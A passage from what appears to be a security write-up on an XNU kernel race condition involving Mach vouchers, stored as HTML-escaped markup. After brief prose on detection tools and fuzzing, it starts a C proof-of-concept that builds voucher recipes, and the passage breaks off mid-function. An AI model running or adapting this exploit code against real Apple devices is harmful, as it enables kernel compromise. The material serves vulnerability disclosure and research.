class=\"BGLtzooHlW-c251\" href=\"https://clang.llvm.org/docs/ThreadSanitizer.html\"&gt;ThreadSanitizer&lt;/a&gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;could be used to dynamically record a mapping between locks and accessed objects/object fields. Such a tool could plausibly have flagged this race condition under normal system use. The false positive rate of such a tool might be unusably high however.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;4) Race-condition fuzzer&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;It&amp;#39;s not inconceivable that a coverage-guided fuzzer could have generated the proof-of-concept shown below, though it would specifically have to have been built to execute parallel testcases.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;As to what technique was actually used, we don&amp;#39;t know. As defenders we need to do a better job making sure that we invest even more effort in all of these possibilities and more.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"BGLtzooHlW-c18 BGLtzooHlW-c5\" id=\"h.hmmckgsh9ct0\"&gt;&lt;span class=\"BGLtzooHlW-c20\"&gt;PoC:&lt;/span&gt;&lt;/h2&gt;&lt;a id=\"t.236cca22f08a2d4239acb5bcd559819eddfeeef7\"&gt;&lt;/a&gt;&lt;a id=\"t.57\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#include&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c16\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#include&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c16\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#include&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c16\"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#include&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c16\"&gt;&amp;lt;pthread.h&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#include&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c16\"&gt;&amp;lt;mach/mach.h&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#include&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c16\"&gt;&amp;lt;mach/mach_voucher.h&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#include&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c16\"&gt;&amp;lt;atm/atm_types.h&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#include&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c16\"&gt;&amp;lt;voucher/ipc_pthread_priority_types.h&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;// @i41nbeer&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;static&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;mach_port_t&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;create_voucher_from_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;size_t recipe_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; mach_port_t voucher &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_PORT_NULL&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; kern_return_t kr &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;host_create_mach_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_host_self&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(),&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_raw_recipe_array_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; recipe_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;kr &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c16\"&gt;&amp;quot;failed to create voucher from recipe\\n&amp;quot;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;static&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;create_single_variable_userdata_voucher_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;size_t len&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;size_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;template_size_out&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; size_t recipe_size &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;sizeof&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;))&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;+&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;calloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;command &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;content_size &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; uint8_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_buf &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;((&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;uint8_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)+&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;sizeof&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; memcpy&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;content_buf&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;template_size_out &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;static&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;create_single_variable_userdata_then_redeem_voucher_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;size_t len&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;size_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;template_size_out&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; size_t recipe_size &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;2&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;sizeof&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;))&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;+&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;calloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;command &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;content_size &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; uint8_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_buf 